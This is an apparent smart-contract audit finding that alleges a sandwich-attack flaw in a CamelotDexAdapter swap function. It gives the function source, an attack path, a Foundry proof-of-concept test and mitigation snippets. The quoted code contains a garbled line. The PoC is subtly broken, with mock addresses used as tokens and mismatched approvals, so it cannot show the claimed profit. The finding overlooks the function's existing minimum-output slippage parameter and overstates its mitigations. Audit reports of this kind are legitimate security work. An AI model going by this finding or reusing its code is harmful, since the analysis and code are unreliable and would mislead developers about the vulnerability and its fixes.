# Attacker manipulates token prices to exploit users via Sandwich Attack

## **Summary**  
The lack of price impact checks in `CamelotDexAdapter` will cause a **Sandwich Attack** for users, as an attacker will **front-run a victim’s swap by purchasing a large amount of tokens, causing the price to rise, and then back-run by selling the tokens at a higher price after the victim's trade is executed**. This results in **significant slippage and financial loss for the victim**.  

---

## **Root Cause**  
In [CamelotDexAdapter.sol](https://github.com/sherlock-audit/2025-01-peapods-finance/blob/d28eb19f4b39d3db7997477460f9f9c76839cb0c/contracts/contracts/dex/CamelotDexAdapter.sol#L32-L54), the function `swapV2Single()` does **not validate price impact before executing the swap**, making it vulnerable to **price manipulation by MEV bots or malicious traders**.  

Example of the affected function:  
```solidity
function swapV2Single(
    address _tokenIn,
    address _tokenOut,
    uint256 _amountIn,
    uint256 _amountOutMin,
    address _recipient
) external override returns (uint256 _amountOut) {
    uint256 _outBefore = IERC20(_tokenOut).balanceOf(_recipient);
    
    if (_amountIn == 0) {
        _amountIn = IERC20(_tokenIn).balanceOf(address(this));
    } else {
        IERC20(_tokenIn).safeTransferFrom(_msgSender(), address(this), _amountIn);
    }

    add](2);
    _path[0] = _tokenIn;
    _path[1] = _tokenOut;

    IERC20(_tokenIn).safeIncreaseAllowance(V2_ROUTER, _amountIn);
    
    ICamelotRouter(V2_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        _amountIn, _amountOutMin, _path, _recipient, address(this), block.timestamp
    );

    return IERC20(_tokenOut).balanceOf(_recipient) - _outBefore;
}
```
### **Issue**:  
- The function **does not check the price impact before or after swapping**, allowing attackers to manipulate token prices.  
- There is **no validation** that ensures the **victim's trade will not be negatively impacted**.  
- Since it uses `swapExactTokensForTokensSupportingFeeOnTransferTokens()`, the attacker can **force slippage** and **extract value from the victim**.  

---

## **Attack Path**  

1. **Attacker monitors pending transactions in the mempool** and finds a victim’s swap trade.  
2. **Attacker submits a front-running transaction**:  
   - Buys a large amount of `_tokenIn` to increase the price of `_tokenOut`.  
3. **Victim's transaction executes**:  
   - The victim buys `_tokenOut` at a **higher price**, leading to **high slippage and loss**.  
4. **Attacker submits a back-running transaction**:  
   - Sells `_tokenOut` at a higher price than before, **profiting from the victim’s trade**.  
5.  **Attacker profits from the victim’s slippage loss**.  

---

## **Impact**  
- **Victims suffer a financial loss** due to slippage and price manipulation.  
- **Attackers gain profits by forcing the victim to buy at a higher price and sell at a lower price**.  
- **Users may lose trust in the DEX and contract due to high slippage and unfair trades**.

## Proof of Concept (PoC)
The following test simulates a **Sandwich Attack** on `CamelotDexAdapter`:  

```solidity

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/CamelotDexAdapter.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SandwichAttackTest is Test {
    CamelotDexAdapter dexAdapter;
    IERC20 tokenIn;
    IERC20 tokenOut;
    address victim;
    address attacker;
    address recipient;
    
    function setUp() public {
        dexAdapter = new CamelotDexAdapter(
            IV3TwapUtilities(address(0x1234)), // Mock contract
            address(0x5678), // Mock V2 Router
            address(0x9ABC)  // Mock V3 Router
        );

        tokenIn = IERC20(address(0x1111)); 
        tokenOut = IERC20(address(0x2222));

        victim = address(0x3333);
        attacker = address(this);
        recipient = address(0x4444);

        deal(address(tokenIn), attacker, 10000 ether);
        deal(address(tokenIn), victim, 100 ether);
    }

    function testSandwichAttack() public {
        uint256 amountInVictim = 100 ether;
        uint256 amountOutMinVictim = 90 ether;

        // 1. Attacker Front-runs
        tokenIn.approve(address(dexAdapter), 5000 ether);
        dexAdapter.swapV2Single(address(tokenIn), address(tokenOut), 5000 ether, 0, attacker);

        // 2. Victim Executes Swap
        vm.prank(victim);
        tokenIn.approve(address(dexAdapter), amountInVictim);
        dexAdapter.swapV2Single(address(tokenIn), address(tokenOut), amountInVictim, amountOutMinVictim, victim);

        // 3. Attacker Back-runs
        dexAdapter.swapV2Single(address(tokenOut), address(tokenIn), 5000 ether, 0, attacker);

        // 4. Verify Attacker Profit
        uint256 attackerProfit = tokenIn.balanceOf(attacker);
        assert(attackerProfit > 10000 ether);
    }
}
```

## **Mitigation Strategies**  

### **1. Implement Slippage Protection**  
Ensure that the price impact does not exceed a set threshold (e.g., 5%) before and after the swap.  

```solidity
uint256 priceBefore = getPrice(_tokenIn, _tokenOut);
...
uint256 priceAfter = getPrice(_tokenIn, _tokenOut);
require(priceAfter >= priceBefore * 95 / 100, "Price manipulated");
```
**Effectiveness**: Prevents severe price manipulation.  

---

### **2. Use Private RPCs (Flashbots, Eden Network, MEV Blocker)**  
Send transactions **privately** to avoid exposure in the public mempool.  
**Effectiveness**: Completely eliminates front-running by keeping transactions hidden.  

---

### 3. Monitor Liquidity Changes Before Execution
Check that the liquidity pool reserves have not been **significantly altered** before executing the swap.  

```solidity
(uint112 reserve0Before, uint112 reserve1Before) = getReserves(_pool);
...
(uint112 reserve0After, uint112 reserve1After) = getReserves(_pool);
require(reserve0After >= reserve0Before * 95 / 100, "Reserve manipulated");
```
**Effectiveness**: Prevents attacks that rely on extreme price swings.
